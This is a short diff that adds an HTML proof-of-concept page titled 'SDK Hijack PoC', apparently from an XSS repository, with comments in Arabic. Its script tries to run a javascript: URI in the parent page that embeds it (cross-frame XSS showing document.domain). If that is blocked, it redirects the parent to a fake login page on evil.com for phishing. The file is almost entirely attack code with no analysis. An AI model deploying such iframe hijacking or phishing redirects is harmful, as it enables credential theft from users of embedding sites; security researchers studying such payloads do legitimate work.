@@ -1,0 +1,21 @@
+https://github.com/hackfoxy26-ops/xss/tree/main<!DOCTYPE html>
+<html>
+<head>
+    <title>SDK Hijack PoC</title>
+</head>
+<body>
+    <script>
+        console.log("Malicious SDK Iframe Loaded!");
+        // محاولة تنفيذ XSS على الصفحة الأم (Parent)
+        try {
+            // بنجرب نغير الـ location بتاع الـ parent لـ javascript URI
+            window.parent.location = "javascript:alert('XSS_BY_MARYOUT_DOM_HIJACKING_DOMAIN_'+document.domain)";
+        } catch(e) {
+            console.log("XSS Blocked by Browser/CSP, falling back to Phishing.");
+            // لو الـ alert اتقفلت، حول الصفحة كلها لموقعك الخبيث
+            window.parent.location = "https://evil.com/fake-login"; 
+        }
+    </script>
+    <h2>Attacker Controlled Iframe</h2>
+</body>
+</html>
